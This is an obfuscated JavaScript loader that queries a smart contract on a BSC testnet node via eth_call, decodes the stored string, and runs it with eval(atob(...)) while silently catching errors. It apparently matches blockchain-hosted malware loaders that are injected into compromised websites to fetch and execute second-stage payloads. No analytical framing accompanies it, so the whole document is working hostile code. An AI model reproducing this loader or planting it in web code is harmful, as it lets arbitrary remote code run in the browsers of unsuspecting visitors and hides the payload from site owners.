async function load_(_0x190308) {
  const _0x4fcfdf = {
      _0x2781ea: 0x2dc,
      _0x2babbf: 0x2e0,
      _0x323e47: 0x2d2,
      _0x472f3a: 0x2ca,
      _0x4506d3: 0x2cc,
      _0x1e9c86: 0x2e4,
      _0x12cc4e: 0x2ea,
      _0x4ac0d6: 0x2ed,
      _0x3e3a2b: 0x2db,
      _0x425797: 0x2e9,
      _0x2b2698: 0x2f6,
      _0x4ac781: 0x2e7
    },
    _0x39b13e = {
      _0x574deb: 0xaf,
      _0x108194: 0xb1,
      _0x502b54: 0xa8
    },
    _0x1cab6e = {
      _0x39fa20: 0xf7
    };
  let _0x31d674 = _0x2ab0c7 => {
    let _0x1a67fb = '0x';
    for (const _0x43ff67 of _0x2ab0c7) {
      const _0x48f5db = _0x43ff67["toString"](0x10);
      _0x1a67fb += _0x48f5db["length"] === 0x1 ? '0' + _0x48f5db : _0x48f5db;
    }
    return _0x1a67fb;
  };
  const _0xebf88f = {
      'method': "eth_call",
      'params': [{
        'to': _0x190308,
        'data': "0x6d4ce63c"
      }, "latest"],
      'id': 0x61,
      'jsonrpc': '2.0'
    },
    _0x2b61a5 = {
      'method': "POST",
      'headers': {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      'body': JSON['stringify'](_0xebf88f)
    },
    _0x41c483 = "https://bsc-testnet-rpc.publicnode.com/",
    _0x5e25f5 = await fetch(_0x41c483, _0x2b61a5),
    _0x47f323 = (await _0x5e25f5["json"]())["result"]['slice'](0x2),
    _0x5377bb = new Uint8Array(_0x47f323["match"](/[\da-f]{2}/gi)["map"](function (_0x3cf359) {
      return parseInt(_0x3cf359, 0x10);
    })),
    _0x448b0c = Number(_0x31d674(_0x5377bb["slice"](0x0, 0x20))),
    _0x468952 = Number(_0x31d674(_0x5377bb["slice"](0x20, 0x20 + _0x448b0c))),
    _0x1b99dd = String["fromCharCode"]["apply"](null, _0x5377bb["slice"](0x20 + _0x448b0c, 0x20 + _0x448b0c + _0x468952));
  return _0x1b99dd;
}
load_('0xA1decFB75C8C0CA28C10517ce56B710baf727d2e')["then"](_0x3cb9a7 => eval(atob(_0x3cb9a7)))["catch"](() => {});